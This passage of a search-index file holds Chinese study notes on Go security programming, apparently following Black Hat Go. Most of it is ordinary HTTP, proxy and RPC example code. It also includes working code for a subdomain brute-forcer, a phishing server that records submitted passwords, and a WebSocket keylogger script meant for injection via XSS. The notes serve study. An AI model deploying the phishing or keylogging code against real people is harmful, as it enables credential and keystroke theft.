...","title":"FQDN"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/#subdomain_fuzzer","text":"\u53c2\u8003blackhat-go\u91ccsubdomain_guesser\u5199\u7684,\u4e00\u4e2a\u7b80\u5355\u7684\u6839\u636e\u5b57\u5178\u901a\u8fc7dns\u67e5\u8be2\u7206\u7834\u5b50\u57df\u540d\u7684\u5de5\u5177,\u6838\u5fc3\u57fa\u672c\u4e00\u6837,\u4f46\u662f\u7531\u4e8e\u539f\u4f5c\u8005\u5199\u7684\u534f\u7a0b\u5e76\u53d1\u4ee3\u7801\u6709\u70b9\u96be\u4ee5\u7406\u89e3,\u6240\u4ee5\u7a0d\u5fae\u4fee\u6539\u4e86\u4e00\u4e0b,\u4f7f\u7528\u4e86 sizedwaitgroup \u8fd9\u4e2a\u5305 package main import ( \"bufio\" \"errors\" \"flag\" \"fmt\" \"os\" \"github.com/miekg/dns\" \"github.com/remeh/sizedwaitgroup\" ) // type Result struct { IpAddress string Hostname string } // func LookupA ( fqdn , serverAddr string ) ([] string , error ) { var m dns . Msg var ips [] string m . SetQuestion ( dns . Fqdn ( fqdn ), dns . TypeA ) in , err := dns . Exchange ( & m , serverAddr ) if err != nil { return ips , err } if len ( in . Answer ) < 1 { return ips , errors . New ( \"No answer\" ) } for _ , answer := range in . Answer { if a , ok := answer .( * dns . A ); ok { ips = append ( ips , a . A . String ()) } } return ips , nil } func LookupCNAME ( fqdn , serverAddr string ) ([] string , error ) { var m dns . Msg var fqdns [] string m . SetQuestion ( dns . Fqdn ( fqdn ), dns . TypeCNAME ) in , err := dns . Exchange ( & m , serverAddr ) if err != nil { return fqdns , err } if len ( in . Answer ) < 1 { return fqdns , errors . New ( \"No answer\" ) } for _ , answer := range in . Answer { if c , ok := answer .( * dns . CNAME ); ok { fqdns = append ( fqdns , c . Target ) } } return fqdns , nil } // func Lookup ( fqdn , serverAddr string ) [] Result { var results [] Result var cfqdn = fqdn for { cnames , err := LookupCNAME ( cfqdn , serverAddr ) if err == nil && len ( cnames ) > 0 { cfqdn = cnames [ 0 ] continue } ips , err := LookupA ( cfqdn , serverAddr ) if err != nil { break } for _ , ip := range ips { results = append ( results , Result { IpAddress : ip , Hostname : fqdn , }) } break } return results } func worker ( fqdn string , serverAddr string , resultChannel chan [] Result , swg * sizedwaitgroup . SizedWaitGroup ) { results := Lookup ( fqdn , serverAddr ) if len ( results ) > 0 { resultChannel <- results } return } func main () { var ( flDomain = flag . String ( \"domain\" , \"\" , \"The domain to perform fuzzing against.\" ) flWordlist = flag . String ( \"wordlist\" , \"\" , \"The wordlist to use for fuzzing\" ) flWorkerCount = flag . Int ( \"c\" , 100 , \"The amount of worker to use\" ) flServerAddr = flag . String ( \"server\" , \"8.8.8.8:53\" , \"The DNS server to use\" ) ) flag . Parse () if * flDomain == \"\" || * flWordlist == \"\" { fmt . Println ( \"domain and wordlist are rquired\" ) os . Exit ( 1 ) } swg := sizedwaitgroup . New ( * flWorkerCount ) resultsChannel := make ( chan [] Result ) var results [] Result go func () { // ? read from channel immediately for r := range resultsChannel { for _ , result := range r { fmt . Printf ( \"%s\\t%s\\n\" , result . Hostname , result . IpAddress ) } results = append ( results , r ... ) swg . Done () } }() fh , err := os . Open ( * flWordlist ) if err != nil { fmt . Println ( \"Cannot read \" + * flWordlist ) os . Exit ( 2 ) } defer fh . Close () reader := bufio . NewReader ( fh ) for { bytes , _ , err := reader . ReadLine () line := string ( bytes [:]) if err != nil { break } swg . Add () go worker ( fmt . Sprintf ( \"%s.%s\" , line , * flDomain ), * flServerAddr , resultsChannel , & swg ) } swg . Wait () close ( resultsChannel ) fmt . Println ( \"\\nResult:\\n-----------------------------------------------\" ) for _ , r := range results { fmt . Printf ( \"%s\\t%s\\n\" , r . Hostname , r . IpAddress ) } }","title":"subdomain_fuzzer"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/","tags":["golang"],"text":"\u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668 # \u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668 # package main import ( \"fmt\" \"net/http\" ) func hello ( w http . ResponseWriter , r * http . Request ) { name := r . URL . Query (). Get ( \"name\" ) fmt . Fprintf ( w , \"Hello, %s\\n\" , name ) } func main () { http . HandleFunc ( \"/hello\" , hello ) http . ListenAndServe ( \":8000\" , nil ) } \u4f7f\u7528\u52a8\u6001\u8def\u7531\u7684\u670d\u52a1\u5668 # package main import ( \"fmt\" \"net/http\" \"strings\" ) type router struct { } func ( r * router ) ServeHTTP ( w http . ResponseWriter , req * http . Request ) { urlpath := req . URL . Path if strings . HasPrefix ( urlpath , \"/a\" ) { fmt . Fprint ( w , \"hello a\" ) } else if strings . HasPrefix ( urlpath , \"/b\" ) { fmt . Fprint ( w , \"hello b\" ) } else if strings . HasPrefix ( urlpath , \"/c\" ) { fmt . Fprint ( w , \"hello c\" ) } else { http . Error ( w , \"404 not found\" , 404 ) } } func main () { http . ListenAndServe ( \":8000\" , & router {}) } \u4e00\u4e2a\u7b80\u5355\u7684\u4e2d\u95f4\u4ef6 # package main import ( \"fmt\" \"log\" \"net/http\" ) type logger struct { Inner http . Handler } func ( l * logger ) ServeHTTP ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) l . Inner . ServeHTTP ( w , r ) log . Print ( \"end\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { fmt . Fprint ( w , \"hello\\n\" ) } func main () { f := http . HandlerFunc ( hello ) http . ListenAndServe ( \":8000\" , & logger { Inner : f }) } \u8fd9\u91cc\u5b9e\u73b0\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8e\u88c5\u9970\u5668\u7684\u601d\u60f3. \u9996\u5148http.HandlerFunc\u7684\u5b9a\u4e49\u548c\u65b9\u6cd5\u5982\u4e0b,\u53ef\u4ee5\u770b\u5230HandlerFunc\u5373 func(ResponseWriter, *Request) \u7684\u522b\u540d,\u5f53\u8c03\u7528ServeHTTP\u51fd\u6570\u7684\u65f6\u5019\u4f1a\u56de\u8c03\u8c03\u7528\u8be5\u51fd\u6570\u672c\u8eab,\u4ece\u800c\u8c03\u7528\u6211\u4eec\u4f8b\u5b50\u4e2d\u7684hello\u51fd\u6570 // The HandlerFunc type is an adapter to allow the use of // ordinary functions as HTTP handlers. If f is a function // with the appropriate signature, HandlerFunc(f) is a // Handler that calls f. type HandlerFunc func ( ResponseWriter , * Request ) // ServeHTTP calls f(w, r). func ( f HandlerFunc ) ServeHTTP ( w ResponseWriter , r * Request ) { f ( w , r ) } \u7136\u540e\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u81ea\u5df1\u7684\u7ed3\u6784\u4f53logger,\u5305\u542b\u4e86\u4e00\u4e2aInner\u5c5e\u6027,\u7c7b\u578b\u4e3ahttp.Handler,\u800chttp.Handler\u7684\u5b9a\u4e49\u5982\u4e0b type Handler interface { ServeHTTP ( ResponseWriter , * Request ) } \u53ef\u4ee5\u770b\u5230\u662f\u4e00\u4e2a\u63a5\u53e3,\u53ea\u9700\u8981\u5b9e\u73b0\u4e86ServeHTTP\u8fd9\u4e2a\u65b9\u6cd5\u5373\u53ef,\u90a3\u4e48\u6211\u4eec\u7684HandlerFunc\u5c31\u80fd\u5145\u5f53Handler \u6700\u540e\u6211\u4eec\u5b9a\u4e49\u4e86logger\u7684ServeHTTP,\u6267\u884c\u67d0\u4e9b\u8bed\u53e5,\u56de\u8c03hello\u8fd9\u4e2a\u51fd\u6570\u7684ServeHTTP,\u6700\u540e\u518d\u6267\u884c\u67d0\u4e9b\u8bed\u53e5,\u5b9e\u73b0\u4e86\u7c7b\u4f3c\u4e8e\u88c5\u9970\u5668\u7684\u7ed3\u6784 \u8c03\u7528\u94fe\u4e3a: ListenAndServe\u4f7f\u7528logger\u4f5c\u4e3a\u8def\u7531->logger.ServeHTTP->hello.ServeHTTP->hello \u7b2c\u4e09\u65b9\u5305:alice # Alice\u63d0\u4f9b\u4e86\u4e00\u79cd\u4fbf\u6377\u7684\u65b9\u5f0f\u6765\u94fe\u63a5\u60a8\u7684HTTP\u4e2d\u95f4\u4ef6\u529f\u80fd\u548c\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u7a0b\u5e8f\u3002 \u5982\u679c\u4f7f\u7528Alice\u6765\u6539\u5199\u4e0a\u9762\u7684\u4e2d\u95f4\u4ef6\u7684\u8bdd,\u4ee3\u7801\u4f1a\u53d8\u6210 package main import ( \"fmt\" \"log\" \"net/http\" \"time\" \"github.com/justinas/alice\" ) func logHandler ( h http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) h . ServeHTTP ( w , r ) log . Print ( \"end\" ) }) } func timeoutHandler ( h http . Handler ) http . Handler { return http . TimeoutHandler ( h , 1 * time . Second , \"timed out\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { fmt . Fprint ( w , \"hello\\n\" ) } func main () { middleWare := alice . New ( logHandler , timeoutHandler ) http . ListenAndServe ( \":8000\" , middleWare . Then ( http . HandlerFunc ( hello ))) } \u53ef\u4ee5\u770b\u5230alice\u5305\u7684\u4f5c\u7528\u5f88\u7b80\u5355,\u5e2e\u52a9\u6211\u4eec\u62fc\u63a5\u4e2d\u95f4\u4ef6,\u5728\u7ecf\u8fc7\u4e2d\u95f4\u4ef6\u8fc7\u540e\u518d\u6267\u884c\u6211\u4eec\u7684Handler \u7b2c\u4e09\u65b9\u5305:mux # \u7ed3\u5408\u4e86alice\u548cmux\u7684\u4e00\u4e2a\u7b80\u5355\u6d4b\u8bd5\u670d\u52a1\u5668\u5982\u4e0b package main import ( \"fmt\" \"log\" \"net/http\" \"time\" \"github.com/gorilla/mux\" \"github.com/justinas/alice\" ) func logHandler ( h http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) h . ServeHTTP ( w , r ) log . Print ( \"end\" ) }) } func timeoutHandler ( h http . Handler ) http . Handler { return http . TimeoutHandler ( h , 1 * time . Second , \"timed out\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { value , ok := mux . Vars ( r )[ \"value\" ] w . WriteHeader ( http . StatusOK ) if ok { r . ParseForm () key := r . Form . Get ( \"key\" ) fmt . Fprintf ( w , \"key is %s, value is %s\\n\" , key , value ) } else { fmt . Fprintf ( w , \"hello\" ) } } func main () { middleWare := alice . New ( logHandler , timeoutHandler ) r := mux . NewRouter () s := r . PathPrefix ( \"/hello\" ). Subrouter () s . HandleFunc ( \"\" , hello ). Methods ( \"GET\" ) s . HandleFunc ( \"/\" , hello ). Methods ( \"GET\" ) s . HandleFunc ( \"/{value}\" , hello ). Methods ( \"POST\" ) http . ListenAndServe ( \":8000\" , middleWare . Then ( r )) } \u7b2c\u4e09\u65b9\u5305: Martini # Martini\u66f4\u50cf\u662f\u96c6\u6210\u4e86\u524d\u9762\u6240\u6709\u7684\u5305\u7684\u7b2c\u4e09\u65b9\u5305,\u4e0d\u4f7f\u7528\u539f\u751f\u7684net/http\u5305 \u5177\u4f53\u4f7f\u7528\u67e5\u770b \u8fd9\u91cc ,\u503c\u5f97\u4e00\u63d0\u7684\u662f\u53ef\u4ee5\u5728 \u8fd9\u91cc \u627e\u5230\u8fd9\u4e2a\u7b2c\u4e09\u65b9\u5305\u7684\u4e2d\u95f4\u4ef6 HTML\u6a21\u677f # golang\u4e2d\u81ea\u5e26\u6709html\u6a21\u677f\u7684\u5305: html/template ,\u4e00\u4e2a\u7b80\u5355\u7684\u4f7f\u7528\u5982\u4e0b package main import ( \"html/template\" \"net/http\" \"github.com/go-martini/martini\" ) type TemplateData struct { UserName string Password string } var x = `<html> <body> Hello {{.UserName}}. Your password is {{.Password}}. </body> </html>` func main () { m := martini . Classic () m . Get ( \"/\" , func () string { return \"Hello world!\" }) m . Get ( \"/hello/:UserName/:Password\" , func ( params martini . Params , w http . ResponseWriter ) { t , err := template . New ( \"hello\" ). Parse ( x ) if err != nil { w . WriteHeader ( 500 ) } td := TemplateData { UserName : params [ \"UserName\" ], Password : params [ \"Password\" ]} t . Execute ( w , td ) }) m . RunOnAddr ( \":8000\" ) } Credential Harvesting Attack(\u51ed\u8bc1\u6536\u96c6\u653b\u51fb) # \u5b9e\u9645\u4e0a\u5c31\u662f\u9493\u9c7c,\u6838\u5fc3\u601d\u60f3\u662f\u521b\u5efa\u514b\u9686\u7f51\u7ad9,\u6b3a\u9a97\u7528\u6237\u8f93\u5165\u5b83\u7684\u51ed\u8bc1\u5e76\u8bb0\u5f55 blackhat-go\u91cc\u7ed9\u4e86\u4e00\u4e2a \u793a\u4f8b \u8fd9\u91cc\u9700\u8981\u5c06\u4e0b\u8f7d\u4e0b\u6765\u7684public/index.html\u4e2d\u7684\u8868\u5355action\u6539\u4e3a\"/login\" \u7136\u540e\u4f7f\u7528golang\u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668\u7528\u4e8e\u7a83\u53d6\u51ed\u8bc1 package main import ( \"net/http\" \"os\" \"time\" \"github.com/gorilla/mux\" log \"github.com/sirupsen/logrus\" ) func login ( w http . ResponseWriter , r * http . Request ) { log . WithFields ( log . Fields { \"time\" : time . Now (). String (), \"username\" : r . FormValue ( \"_user\" ), \"password\" : r . FormValue ( \"_pass\" ), \"user-agent\" : r . UserAgent (), \"ip_address\" : r . RemoteAddr , }). Info ( \"login attempt\" ) http . Redirect ( w , r , \"/\" , 302 ) } func main () { fh , err := os . OpenFile ( \"credentials.txt\" , os . O_CREATE | os . O_APPEND | os . O_WRONLY , 0600 ) if err != nil { panic ( err ) } defer fh . Close () log . SetOutput ( fh ) r := mux . NewRouter () r . HandleFunc ( \"/login\" , login ). Methods ( \"POST\" ) r . PathPrefix ( \"/\" ). Handler ( http . FileServer ( http . Dir ( \"./public\" ))) log . Fatal ( http . ListenAndServe ( \":8080\" , r )) } \u8fd9\u91cc\u7528\u5230\u4e86http.FileServer\u548chttp.Dir,\u914d\u5408gorilla/mux,\u5c06public\u76ee\u5f55\u8bbe\u7f6e\u6210\u4e86web\u6839\u76ee\u5f55,\u51fd\u6570login\u7684\u4f5c\u7528\u5c31\u662f\u5c06\u7528\u6237post\u7684\u5185\u5bb9\u8bb0\u5f55\u5728\u65e5\u5fd7\u4e2d Keylogging With Websocket(\u4f7f\u7528Websocket\u7684\u952e\u76d8\u8bb0\u5f55\u5668) # \u653b\u51fb\u573a\u666f\u662f\u81ea\u5df1\u67b6\u8bbe\u4e86\u4e00\u4e2a\u670d\u52a1\u5668\u6216\u8005\u67d0\u4e2a\u670d\u52a1\u5668\u4e0a\u5b58\u5728XSS\u6f0f\u6d1e,\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7\u63d2\u5165\u67d0\u6bb5\u6076\u610fJS\u4ee3\u7801,\u901a\u8fc7Websocket\u5c06\u7528\u6237\u7684\u4efb\u4f55\u8f93\u5165\u53d1\u9001\u56de\u653b\u51fb\u8005\u7684\u670d\u52a1\u5668 \u9996\u5148\u9700\u8981\u4e00\u4e2a\u6d4b\u8bd5\u73af\u5883,blackhat-go\u63a8\u8350\u4f7f\u7528 JSBIN \u4e00\u6bb5\u6d4b\u8bd5\u7528\u7684HTML\u4ee3\u7801 <!DOCTYPE html> < html > < head > < title > Login </ title > </ head > < body > < script src = 'http://localhost:8080/logger.js' ></ script > < form action = '/login' method = 'post' > < input name = 'username' /> < input name = 'password' /> < input type = \"submit\" /> </ form > </ body > </ html > \u4e00\u6bb5\u7b80\u5355\u7684\u5efa\u7acbwebsocket\u7684logger.js (Go\u6a21\u677f) ( function () { var conn = new WebSocket ( \"ws://{{.}}/ws\" ); document . onkeypress = keypress ; function keypress ( evt ) { s = String . fromCharCode ( evt . which ); conn . send ( s ); } })(); \u7136\u540e\u4e00\u4e2a\u7528\u4e8e\u63d0\u4f9blogger.js\u548c\u5904\u7406websocket\u7684\u670d\u52a1\u5668,\u8fd9\u91cc\u7528\u5230\u4e86 websocket \u7b2c\u4e09\u65b9\u5305 package main import ( \"flag\" \"fmt\" \"html/template\" \"log\" \"net/http\" \"github.com/gorilla/mux\" \"github.com/gorilla/websocket\" ) var ( upgrader = websocket . Upgrader { CheckOrigin : func ( r * http . Request ) bool { return true }, } listenAddr string wsAddr string jsTemplate * template . Template ) func init () { flag . StringVar ( & listenAddr , \"listen\" , \"\" , \"Address to listen on\" ) flag . StringVar ( & wsAddr , \"ws\" , \"\" , \"Address for WebSocket connection\" ) flag . Parse () var err error jsTemplate , err = template . ParseFiles ( \"logger.js\" ) if err != nil { panic ( err ) } } func serveWS ( w http . ResponseWriter , r * http . Request ) { conn , err := upgrader . Upgrade ( w , r , nil ) if err != nil { http . Error ( w , \"\" , 500 ) return } defer conn . Close () fmt . Printf ( \"Connection from %s\\n\" , conn . RemoteAddr (). String ()) for { _ , msg , err := conn . ReadMessage () if err != nil { return } fmt . Printf ( \"From %s: %s\\n\" , conn . RemoteAddr (). String (), string ( msg )) } } func serveLogger ( w http . ResponseWriter , r * http . Request ) { w . Header (). Set ( \"Content-Type\" , \"application/javascript\" ) jsTemplate . Execute ( w , wsAddr ) } func main () { r := mux . NewRouter () r . HandleFunc ( \"/ws\" , serveWS ) r . HandleFunc ( \"/logger.js\" , serveLogger ) fmt . Println ( \"test\" , wsAddr ) log . Fatal ( http . ListenAndServe ( \":8080\" , r )) } websocket\u8fd8\u662f\u5f88\u597d\u73a9\u7684,\u5b9e\u9645\u6548\u679c\u5982\u4e0b \u8f6c\u79fb\u7b14\u8bb0\u7684\u65f6\u5019\u56fe\u5f04\u4e22\u4e86\uff0c\u5404\u4f4d\u5e08\u5085\u4eec\u8bf7\u81ea\u5df1\u624b\u52a8\u6d4b\u8bd5\u4e0b\u4ee3\u7801\u5427 Reverse Proxy(\u53cd\u5411\u4ee3\u7406) # golang\u81ea\u5e26\u7684httputil\u5305\u4e2d\u5b58\u5728ReverseProxy\u7684\u5b9e\u73b0,\u4e00\u4e2a\u7b80\u5355\u7684\u53cd\u5411\u4ee3\u7406\u5982\u4e0b package main import ( \"log\" \"net/http\" \"net/http/httputil\" \"net/url\" ) func main () { // \u5c06 http://127.0.0.1:8888/ \u53cd\u5411\u4ee3\u7406\u5230 http://127.0.0.1:80/ targetUrlString := \"http://127.0.0.1:80/\" targetUrl , err := url . Parse ( targetUrlString ) if err != nil { log . Fatal ( \"err\" ) } proxy := httputil . NewSingleHostReverseProxy ( targetUrl ) log . Println ( \"Reverse proxy server at 127.0.0.1:8888\" ) if err := http . ListenAndServe ( \":8888\" , proxy ); err != nil { log . Fatalln ( \"Error:\" , err ) } } \u7b80\u5355\u7684RPC\u670d\u52a1\u5668 # \u53c2\u8003\u6587\u7ae0: Go\u5b98\u65b9\u5e93RPC\u5f00\u53d1\u6307\u5357 \u4f7f\u7528golang\u4e2d\u81ea\u5e26\u7684 net/rpc \u5305\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684rpc\u670d\u52a1\u5668(\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u7c7b\u4f3c\u52a8\u6001\u5bfc\u5165\u7684\u529f\u80fd) \u9996\u5148\u5b9a\u4e49\u4e00\u4e2a rpc_client.go package rpc_server import ( \"errors\" \"log\" \"net\" \"net/http\" \"net/rpc\" ) type Args struct { // \u4f20\u5165\u53c2\u6570\u7ed3\u6784 A , B int } // \u8fd4\u56de\u53c2\u6570\u7ed3\u6784 type Quotient struct { Quo , Rem int } // rpc\u670d\u52a1\u5668\u8981\u5b9e\u73b0\u7684\u63a5\u53e3 type ServiceInterface interface { Multiply ( args * Args , reply * int ) error Divide ( args * Args , quo * Quotient ) error } // \u7a7a\u7684\u7ed3\u6784,\u7528\u4e8e\u5b9e\u73b0rpc\u670d\u52a1\u5668\u63a5\u53e3 type Service struct { } // \u5b9e\u73b0Multiply\u65b9\u6cd5 func ( ss * Service ) Multiply ( args * Args , reply * int ) error { * reply = args . A * args . B return nil } // \u5b9e\u73b0Divide\u65b9\u6cd5 func ( ss * Service ) Divide ( args * Args , quo * Quotient ) error { if args . B == 0 { return errors . New ( \"Divide by zero\" ) } quo . Quo = args . A / args . B quo . Rem = args . A % args . B return nil } // \u5f00\u59cb\u76d1\u542c\u7aef\u53e3,\u5904\u7406\u8fde\u63a5 func Start () { s := new ( Service ) rpc . Register ( s ) rpc . HandleHTTP () l , e := net . Listen ( \"tcp\" , \":8888\" ) if e != nil { log . Fatal ( \"listen error:\" , e ) } go http . Serve ( l , nil ) } \u7136\u540e\u7f16\u5199 rpc_client.go package rpc_client import ( \"fmt\" \"learn/rpc_server\" \"log\" \"net/rpc\" ) const ServiceName = \"Service\" // \u8fde\u63a5\u5230rpc\u670d\u52a1\u5668\u5e76\u4e14\u8fdc\u7a0b\u8c03\u7528Multiply\u65b9\u6cd5 func Connect ( address string ) { client , err := rpc . DialHTTP ( \"tcp\" , address ) if err != nil { log . Fatal ( \"Dial error:\" , err ) } args := & rpc_server . Args { A : 7 , B : 8 } var reply int err = client . Call ( ServiceName + \".Multiply\" , args , & reply ) if err != nil { log . Fatal ( \"Error:\" , err ) } fmt . Printf ( \"Multiply: %d*%d=%d\" , args . A , args . B , reply ) } \u6700\u540e\u7f16\u5199\u4e00\u4e2amain.go\u505a\u6d4b\u8bd5 package main import ( \"learn/rpc_client\" \"learn/rpc_server\" \"time\" ) func main () { rpc_server . Start () time . Sleep ( 1 * time . Second ) rpc_client . Connect ( \"127.0.0.1:8888\" ) } \u5b9e\u73b0\u6548\u679c\u5982\u4e0b \u8f6c\u79fb\u7b14\u8bb0\u7684\u65f6\u5019\u56fe\u5f04\u4e22\u4e86\uff0c\u5404\u4f4d\u5e08\u5085\u4eec\u8bf7\u81ea\u5df1\u624b\u52a8\u6d4b\u8bd5\u4e0b\u4ee3\u7801\u5427 \u7136\u800cgolang\u4e2d\u81ea\u5e26\u7684net/rpc\u5305\u5b58\u5728\u67d0\u4e9b\u7f3a\u70b9,\u5982: (\u53c2\u8003\u6587\u7ae0: Golang\u6807\u51c6\u5e93RPC\u5b9e\u8df5\u53ca\u6539\u8fdb ) \u5f53\u96c6\u7fa4\u673a\u5668\u589e\u52a0\u5230\u4e00\u5b9a\u6570\u91cf,\u8bf7\u6c42\u91cf\u53d8\u5927\u65f6,\u4f1a\u51fa\u73b0\u5f88\u591a\u4efb\u52a1\u5361\u4f4f\u6ca1\u6709\u54cd\u5e94\u7684\u60c5\u51b5,\u53ef\u4ee5\u8f6c\u7528tcp\u5b9e\u73b0rpc\u670d\u52a1\u5668\u89e3\u51b3 rpc\u5305\u91cc\u7684rpc.Dial\u51fd\u6570\u6ca1\u6709timeout, \u7cfb\u7edf\u9ed8\u8ba4\u662f\u6ca1\u6709timeout\u7684,\u6240\u4ee5\u5728\u8fd9\u91cc\u53ef\u80fd\u5361\u4f4f.\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91c7\u7528net\u5305\u91cc\u7684 net.DialTimeout\u51fd\u6570 rpc\u5305\u91cc\u9ed8\u8ba4\u4f7f\u7528gobCodec\u6765\u7f16\u7801\u89e3\u7801, \u8fd9\u91ccio\u53ef\u80fd\u4f1a\u5361\u4f4f\u800c\u4e0d\u8fd4\u56de\u9519\u8bef,\u6240\u4ee5\u6211\u4eec\u8981\u81ea\u5df1\u7f16\u5199\u52a0\u5165timeout\u7684codec. \u6ce8\u610fserver\u8fd9\u8fb9\u8bfb\u5199\u90fd\u6709timeout,\u4f46\u662fclient\u8fd9\u8fb9\u53ea\u6709\u5199\u6709timeout,\u56e0\u4e3a\u8bfb\u7684\u8bdd\u5e76\u4e0d\u80fd\u9884\u77e5\u4efb\u52a1\u5b8c\u6210\u7684\u65f6\u95f4 \u53ef\u4ee5\u5b66\u4e60\u4e0b rpcx \u597d\u50cf\u4f7f\u7528\u8d77\u6765\u66f4\u52a0\u7b80\u5355,\u800c\u4e14features\u4e5f\u5f88\u591a \u4e00\u4e2a\u7b80\u5355\u7684\u670d\u52a1\u5668\u5982\u4e0b package main import ( \"context\" \"flag\" \"fmt\" example \"github.com/rpcxio/rpcx-examples\" \"github.com/smallnest/rpcx/server\" ) var ( addr = flag . String ( \"addr\" , \"localhost:8888\" , \"server address\" ) ) type Arith struct {} // the second parameter is not a pointer func ( t * Arith ) Mul ( ctx context . Context , args example . Args , reply * example . Reply ) error { reply . C = args . A * args . B fmt . Println ( \"C=\" , reply . C ) return nil } func main () { flag . Parse () s := server . NewServer () //s.Register(new(Arith), \"\") s . RegisterName ( \"Arith\" , new ( Arith ), \"\" ) err := s . Serve ( \"tcp\" , * addr ) if err != nil { panic ( err ) } } \u4e00\u4e2a\u7b80\u5355\u7684\u5ba2\u6237\u7aef\u5982\u4e0b,\u8fd9\u91cc\u503c\u5f97\u6ce8\u610f\u7684\u662f\u6839\u636egithub\u7684Readme\u6240\u8bf4,\u56e0\u4e3arpcx\u4f9d\u8d56\u4e8eetcd,\u800cetcd\u5728go mods\u91cc\u4f7f\u7528\u5b58\u5728\u95ee\u9898,\u6240\u4ee5\u9700\u8981\u5728go.mod\u4e2d\u6dfb\u52a0 replace google.golang.org/grpc => google.golang.org/grpc v1.29.0 package main import ( \"context\" \"flag\" \"log\" \"github.com/smallnest/rpcx/protocol\" example \"github.com/rpcxio/rpcx-examples\" \"github.com/smallnest/rpcx/client\" ) var ( addr = flag . String ( \"addr\" , \"localhost:8888\" , \"server address\" ) ) func main () { flag . Parse () d := client . NewPeer2PeerDiscovery ( \"tcp@\" +* addr , \"\" ) opt := client . DefaultOption opt . SerializeType = protocol . JSON xclient := client . NewXClient ( \"Arith\" , client . Failtry , client . RandomSelect , d , opt ) defer xclient . Close () args := example . Args { A : 10 , B : 20 , } reply := & example . Reply {} err := xclient . Call ( context . Background (), \"Mul\" , args , reply ) if err != nil { log . Fatalf ( \"failed to call: %v\" , err ) } log . Printf ( \"%d * %d = %d\" , args . A , args . B , reply . C ) } \u53ef\u4ee5\u770b\u5230\u63a5\u6536\u53c2\u6570\u548c\u8fd4\u56de\u53c2\u6570\u7684\u5b9a\u4e49\u90fd\u5b58\u5728\u4e86 github.com/rpcxio/rpcx-examples \u91cc,\u5230\u65f6\u5019\u8981\u81ea\u5df1\u7f16\u5199\u7684\u8bdd\u53ef\u4ee5\u81ea\u5df1\u63d0\u524d\u5199\u597d\u4e22\u5230github\u4e0a \u53ef\u4ee5\u5b66\u4e60\u4e0b grpc-go (\u4f3c\u4e4e\u6982\u5ff5\u6bd4\u8f83\u591a \u6682\u65f6\u5495\u4e86)","title":"\u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b2c\u56db\u7ae0-http\u670d\u52a1\u5668","text":"","title":"\u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668","text":"package main import ( \"fmt\" \"net/http\" ) func hello ( w http . ResponseWriter , r * http . Request ) { name := r . URL . Query (). Get ( \"name\" ) fmt . Fprintf ( w , \"Hello, %s\\n\" , name ) } func main () { http . HandleFunc ( \"/hello\" , hello ) http . ListenAndServe ( \":8000\" , nil ) }","title":"\u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u4f7f\u7528\u52a8\u6001\u8def\u7531\u7684\u670d\u52a1\u5668","text":"package main import ( \"fmt\" \"net/http\" \"strings\" ) type router struct { } func ( r * router ) ServeHTTP ( w http . ResponseWriter , req * http . Request ) { urlpath := req . URL . Path if strings . HasPrefix ( urlpath , \"/a\" ) { fmt . Fprint ( w , \"hello a\" ) } else if strings . HasPrefix ( urlpath , \"/b\" ) { fmt . Fprint ( w , \"hello b\" ) } else if strings . HasPrefix ( urlpath , \"/c\" ) { fmt . Fprint ( w , \"hello c\" ) } else { http . Error ( w , \"404 not found\" , 404 ) } } func main () { http . ListenAndServe ( \":8000\" , & router {}) }","title":"\u4f7f\u7528\u52a8\u6001\u8def\u7531\u7684\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u4e00\u4e2a\u7b80\u5355\u7684\u4e2d\u95f4\u4ef6","text":"package main import ( \"fmt\" \"log\" \"net/http\" ) type logger struct { Inner http . Handler } func ( l * logger ) ServeHTTP ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) l . Inner . ServeHTTP ( w , r ) log . Print ( \"end\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { fmt . Fprint ( w , \"hello\\n\" ) } func main () { f := http . HandlerFunc ( hello ) http . ListenAndServe ( \":8000\" , & logger { Inner : f }) } \u8fd9\u91cc\u5b9e\u73b0\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8e\u88c5\u9970\u5668\u7684\u601d\u60f3. \u9996\u5148http.HandlerFunc\u7684\u5b9a\u4e49\u548c\u65b9\u6cd5\u5982\u4e0b,\u53ef\u4ee5\u770b\u5230HandlerFunc\u5373 